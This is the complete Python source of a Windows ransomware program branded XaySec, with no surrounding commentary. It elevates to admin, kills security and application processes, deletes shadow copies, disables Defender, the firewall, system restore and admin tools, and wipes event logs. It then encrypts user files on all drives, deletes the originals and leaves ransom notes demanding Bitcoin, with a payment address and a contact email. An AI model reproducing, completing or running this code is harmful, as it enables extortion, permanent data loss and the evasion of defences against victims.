import os
import sys
import ctypes
from ctypes import wintypes
import struct
import hashlib
import string
import threading
import subprocess
import time
import winreg
from pathlib import Path

advapi32 = ctypes.windll.advapi32
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
shell32 = ctypes.windll.shell32

PROV_RSA_AES = 24
CRYPT_VERIFYCONTEXT = 0xF0000000
CRYPT_NEWKEYSET = 0x00000008
CALG_AES_256 = 0x00006610
CRYPT_MODE_CBC = 1
CRYPT_EXPORTABLE = 0x00000001
PLAINTEXTKEYBLOB = 0x08
CUR_BLOB_VERSION = 2
KP_IV = 1
KP_MODE = 4

class AES256_CBC:
    def __init__(self, key, iv):
        self.hProv = wintypes.HCRYPTPROV(0)
        self.hKey = wintypes.HCRYPTKEY(0)
        
        ret = advapi32.CryptAcquireContextW(ctypes.byref(self.hProv), None, None, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)
        if not ret:
            ret = advapi32.CryptAcquireContextW(ctypes.byref(self.hProv), None, None, PROV_RSA_AES, CRYPT_NEWKEYSET)
            if not ret:
                raise RuntimeError("CryptAcquireContext failed")
        
        key_blob = self._build_plaintext_keyblob(key)
        ret = advapi32.CryptImportKey(self.hProv, key_blob, len(key_blob), 0, CRYPT_EXPORTABLE, ctypes.byref(self.hKey))
        if not ret:
            raise RuntimeError("CryptImportKey failed")
        
        iv_bytes = (ctypes.c_char * 16)(*iv)
        ret = advapi32.CryptSetKeyParam(self.hKey, KP_IV, iv_bytes, 0)
        if not ret:
            raise RuntimeError("CryptSetKeyParam IV failed")
        
        mode = ctypes.c_int(CRYPT_MODE_CBC)
        ret = advapi32.CryptSetKeyParam(self.hKey, KP_MODE, ctypes.byref(mode), 0)
        if not ret:
            raise RuntimeError("CryptSetKeyParam mode failed")

    def _build_plaintext_keyblob(self, key):
        header_len = 12
        blob = (ctypes.c_char * (header_len + len(key)))()
        struct.pack_into("<I", blob, 0, PLAINTEXTKEYBLOB)
        struct.pack_into("<I", blob, 4, CUR_BLOB_VERSION)
        struct.pack_into("<I", blob, 8, CALG_AES_256)
        ctypes.memmove(ctypes.byref(blob, header_len), key, len(key))
        return bytes(blob)

    def encrypt(self, plaintext):
        if len(plaintext) == 0:
            return b''
        
        buf_len = len(plaintext) + 16
        buf = (ctypes.c_char * buf_len)()
        ctypes.memmove(buf, plaintext, len(plaintext))
        data_len = wintypes.DWORD(len(plaintext))
        
        ret = advapi32.CryptEncrypt(self.hKey, 0, True, 0, buf, ctypes.byref(data_len), buf_len)
        if not ret:
            raise RuntimeError("CryptEncrypt failed")
        return bytes(buf[:data_len.value])

    def close(self):
        if self.hKey:
            advapi32.CryptDestroyKey(self.hKey)
            self.hKey = 0
        if self.hProv:
            advapi32.CryptReleaseContext(self.hProv, 0)
            self.hProv = 0

PASSPHRASE = "xAY$ec_Ultra#Key!2024"
SALT = bytes.fromhex('3a7c9f1eb245d861e904f3a7c61b5e82')

TARGET_EXTENSIONS = {
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.txt', '.csv', '.rtf', '.odt', '.ods', '.odp',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.ico',
    '.mp3', '.wav', '.wma', '.aac', '.flac', '.ogg',
    '.mp4', '.avi', '.mov', '.mkv', '.wmv', '.flv',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2',
    '.db', '.sql', '.sqlite', '.mdb', '.accdb',
    '.html', '.php', '.asp', '.aspx', '.js', '.css',
    '.py', '.java', '.c', '.cpp', '.h', '.cs', '.vb',
    '.ps1', '.bat', '.cmd', '.sh',
    '.ini', '.cfg', '.conf', '.log',
    '.xml', '.json', '.yaml', '.yml', '.toml',
    '.svg', '.psd', '.ai', '.eps',
    '.iso', '.img', '.vmdk', '.vhd', '.vhdx',
    '.backup', '.bak', '.old', '.dat', '.key', '.pem', '.crt',
    '.pst', '.ost', '.msg', '.eml', '.mbox', '.indd', '.qbb',
    '.mdf', '.ldf', '.ndf', '.trn', '.bkf', '.wbcat'
}

RANSOM_NOTE = """YOUR FILES ARE ENCRYPTED - XaySec Ransomware

All your important data has been encrypted with AES-256-CBC.
File extension changed to .Xaysec

To recover files, send 1000 USD in Bitcoin to:
bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w

After payment, contact: leakserversupport@gmail.com
You will receive decryption tool and unique key.

Free test decryption for 1 small file:
https://xaysec.zya.me/

Do not rename or modify files – permanent loss.
Do not use any third-party recovery tools.

Your unique ID: {id}
"""

def derive_key(passphrase, salt):
    return hashlib.pbkdf2_hmac('sha256', passphrase.encode('utf-8'), salt, 200000, dklen=32)

def encrypt_file(file_path, key):
    try:
        if not os.path.exists(file_path):
            return False
        if os.path.getsize(file_path) == 0:
            return False
        
        iv = os.urandom(16)
        with open(file_path, 'rb') as f:
            plain_data = f.read()
        
        if len(plain_data) == 0:
            return False
        
        cipher = AES256_CBC(key, iv)
        encrypted = cipher.encrypt(plain_data)
        cipher.close()
        
        new_path = file_path.with_suffix('.Xaysec')
        
        with open(new_path, 'wb') as f:
            f.write(iv + encrypted)
        
        os.remove(file_path)
        return True
    except:
        return False

def should_encrypt(file_path):
    ext = file_path.suffix.lower()
    if ext == '.Xaysec':
        return False
    if file_path.name.lower() == 'xaysec_readme.txt':
        return False
    return ext in TARGET_EXTENSIONS

def create_ransom_note(directory, unique_id):
    ransom_path = os.path.join(directory, "Xaysec_ReadMe.txt")
    try:
        with open(ransom_path, 'w', encoding='utf-8') as f:
            f.write(RANSOM_NOTE.format(id=unique_id))
        return True
    except:
        return False

def process_directory(directory, key, unique_id):
    try:
        create_ransom_note(directory, unique_id)
        
        items = os.listdir(directory)
        for item in items:
            full_path = os.path.join(directory, item)
            if os.path.isfile(full_path):
                p = Path(full_path)
                if should_encrypt(p):
                    encrypt_file(p, key)
    except:
        pass

def walk_and_encrypt(drive, key, unique_id):
    try:
        skip_folders = ['Windows', 'Program Files', 'Program Files (x86)', 'ProgramData', 
                        'System Volume Information', '$Recycle.Bin', 'Boot', 'Recovery',
                        'Microsoft', 'Application Data', 'AppData', 'Local Settings',
                        'Windows.old', 'Temp', 'Tmp', 'Cache', 'LogFiles']
        
        for root, dirs, files in os.walk(drive):
            dirs[:] = [d for d in dirs if d not in skip_folders]
            process_directory(root, key, unique_id)
    except:
        pass

def run_cmd(cmd):
    try:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
    except:
        pass

def delete_shadows():
    run_cmd('vssadmin delete shadows /all /quiet')
    run_cmd('wmic shadowcopy delete')
    run_cmd('powershell.exe -command "Get-WmiObject -Class Win32_ShadowCopy | Remove-WmiObject"')
    run_cmd('vssadmin resize shadowstorage /for=C: /on=C: /maxsize=401MB')

def disable_windows_defender():
    run_cmd('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f')
    run_cmd('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f')
    run_cmd('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f')
    run_cmd('sc stop WinDefend')
    run_cmd('sc config WinDefend start= disabled')
    run_cmd('sc stop MpSvc')
    run_cmd('sc config MpSvc start= disabled')
    run_cmd('taskkill /f /im MSASCui.exe')
    run_cmd('taskkill /f /im MsMpEng.exe')
    run_cmd('taskkill /f /im SecurityHealthService.exe')
    run_cmd('taskkill /f /im WindowsDefender.exe')
    run_cmd('powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"')
    run_cmd('powershell -command "Set-MpPreference -DisableBehaviorMonitoring $true"')
    run_cmd('powershell -command "Set-MpPreference -DisableBlockAtFirstSeen $true"')
    run_cmd('powershell -command "Set-MpPreference -DisableIOAVProtection $true"')
    run_cmd('powershell -command "Set-MpPreference -DisablePrivacyMode $true"')
    run_cmd('powershell -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"')
    run_cmd('powershell -command "Set-MpPreference -DisableArchiveScanning $true"')
    run_cmd('powershell -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"')
    run_cmd('powershell -command "Set-MpPreference -DisableScriptScanning $true"')
    run_cmd('powershell -command "Set-MpPreference -SubmitSamplesConsent 2"')

def disable_firewall():
    run_cmd('netsh advfirewall set allprofiles state off')
    run_cmd('sc stop MpsSvc')
    run_cmd('sc config MpsSvc start= disabled')

def disable_system_restore():
    run_cmd('sc stop SrService')
    run_cmd('sc config SrService start= disabled')
    run_cmd('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f')
    run_cmd('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f')

def kill_security_processes():
    processes = ['sqlservr.exe', 'mysqld.exe', 'oracle.exe', 'outlook.exe', 'excel.exe', 'word.exe', 
                 'powerpnt.exe', 'winword.exe', 'msaccess.exe', 'onenote.exe', 'visio.exe',
                 'firefox.exe', 'chrome.exe', 'opera.exe', 'brave.exe', 'msedge.exe',
                 'steam.exe', 'epicgameslauncher.exe', 'origin.exe', 'discord.exe',
                 'qbittorrent.exe', 'utorrent.exe', 'deluge.exe', 'transmission.exe',
                 'vmware.exe', 'virtualbox.exe', 'docker.exe', 'hyperv.exe',
                 'mbam.exe', 'avgui.exe', 'avgtray.exe', 'avastui.exe', 'kaspersky.exe',
                 'nod32.exe', 'eset.exe', 'mcafee.exe', 'symantec.exe', 'norton.exe']
    for proc in processes:
        run_cmd(f'taskkill /f /im {proc}')

def disable_task_manager():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        winreg.CreateKey(key, subkey)
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
    except:
        pass

def disable_registry_tools():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(handle)
    except:
        pass

def disable_cmd():
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Policies\Microsoft\Windows\System"
        winreg.CreateKey(key, subkey)
        handle = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "DisableCMD", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(handle)
    except:
        pass

def clear_event_logs():
    run_cmd('wevtutil cl System')
    run_cmd('wevtutil cl Application')
    run_cmd('wevtutil cl Security')
    run_cmd('wevtutil cl Setup')
    run_cmd('wevtutil cl Windows PowerShell')

def spread_ransom_note_all_drives(unique_id):
    drives = []
    for d in string.ascii_uppercase:
        drive_path = f"{d}:\\"
        if os.path.exists(drive_path):
            drives.append(drive_path)
    
    for drive in drives:
        try:
            create_ransom_note(drive, unique_id)
        except:
            pass

def show_ransom_message(unique_id):
    try:
        desktop = os.path.join(os.environ.get('USERPROFILE', 'C:\\Users\\Default'), 'Desktop')
        note_path = os.path.join(desktop, "Xaysec_ReadMe.txt")
        if os.path.exists(note_path):
            subprocess.run(f'notepad.exe "{note_path}"', shell=True)
    except:
        pass
    
    try:
        user32.MessageBoxW(0, "All your files have been encrypted with AES-256!\n\nFile extension changed to .Xaysec\n\nRead Xaysec_ReadMe.txt for decryption instructions.", "XaySec Ransomware", 0x10)
    except:
        pass

def main():
    if not shell32.IsUserAnAdmin():
        shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()
    
    unique_id = hashlib.md5(os.urandom(32)).hexdigest()[:16]
    key = derive_key(PASSPHRASE, SALT)
    
    kill_security_processes()
    delete_shadows()
    disable_windows_defender()
    disable_firewall()
    disable_system_restore()
    disable_task_manager()
    disable_registry_tools()
    disable_cmd()
    clear_event_logs()
    
    drives = []
    for d in string.ascii_uppercase:
        drive_path = f"{d}:\\"
        if os.path.exists(drive_path):
            drives.append(drive_path)
    
    threads = []
    for drv in drives:
        t = threading.Thread(target=walk_and_encrypt, args=(drv, key, unique_id))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join(timeout=600)
    
    spread_ransom_note_all_drives(unique_id)
    show_ransom_message(unique_id)

if __name__ == "__main__":
    main()